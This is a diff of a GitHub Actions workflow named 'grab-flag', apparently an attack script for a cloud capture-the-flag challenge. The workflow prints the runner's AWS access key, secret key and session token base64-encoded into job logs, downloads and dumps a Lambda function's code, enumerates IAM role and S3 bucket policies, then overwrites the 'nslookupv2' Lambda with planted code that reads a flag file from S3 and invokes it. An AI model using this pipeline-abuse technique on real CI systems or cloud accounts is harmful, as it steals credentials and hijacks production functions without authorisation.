@@ -1,8 +1,10 @@
-﻿name: grab-flag
+name: grab-flag
 on:
   workflow_dispatch:
   push:
-    branches: ['**']
+    branches:
+      - corgi
+      - main
 permissions:
   id-token: write
   contents: read
@@ -24,31 +26,35 @@ jobs:
           set +e
           {
             aws sts get-caller-identity
-            python3 - <<'PY'
+            python3 - <<'PY2'
 import os,base64
 for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']:
  print(k+'_B64='+base64.b64encode((os.environ.get(k,'') or '').encode()).decode())
-PY
+PY2
             aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1
             URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
             curl -sL "$URL" -o /tmp/lam.zip
-            python3 - <<'PY'
-import zipfile
-z=zipfile.ZipFile('/tmp/lam.zip')
-for n in z.namelist():
- print('FILE',n); print(z.read(n)[:3000].decode('utf-8','replace'))
-PY
-            aws iam list-attached-role-policies --role-name cicdRole
-            P=$(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[0].PolicyArn' --output text)
-            V=$(aws iam get-policy --policy-arn "$P" --query 'Policy.DefaultVersionId' --output text)
-            aws iam get-policy-version --policy-arn "$P" --version-id "$V"
-            aws s3api get-bucket-policy --bucket codec4f26c862a321ef5
-            mkdir -p /tmp/plant && cat > /tmp/plant/lambda_function.py <<'PY'
+            python3 - <<'PY2'
+import zipfile,os
+if os.path.exists('/tmp/lam.zip') and os.path.getsize('/tmp/lam.zip')>0:
+ z=zipfile.ZipFile('/tmp/lam.zip')
+ for n in z.namelist():
+  print('FILE',n); print(z.read(n)[:3000].decode('utf-8','replace'))
+PY2
+            aws iam list-attached-role-policies --role-name cicdRole 2>&1
+            P=$(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[0].PolicyArn' --output text 2>/dev/null)
+            if [ -n "$P" ] && [ "$P" != "None" ]; then
+              V=$(aws iam get-policy --policy-arn "$P" --query 'Policy.DefaultVersionId' --output text)
+              aws iam get-policy-version --policy-arn "$P" --version-id "$V" 2>&1
+            fi
+            aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 2>&1
+            mkdir -p /tmp/plant
+            cat > /tmp/plant/lambda_function.py <<'PY2'
 import subprocess,json
 def lambda_handler(event, context):
     r=subprocess.run('aws s3 cp s3://codec4f26c862a321ef5/flag.txt -',shell=True,capture_output=True,text=True)
     return {'statusCode':200,'headers':{'Content-Type':'application/json'},'body':json.dumps({'flag':r.stdout,'err':r.stderr,'rc':r.returncode})}
-PY
+PY2
             (cd /tmp/plant && zip -q /tmp/plant.zip lambda_function.py)
             aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/plant.zip 2>&1
             aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{}' /tmp/out.json 2>&1
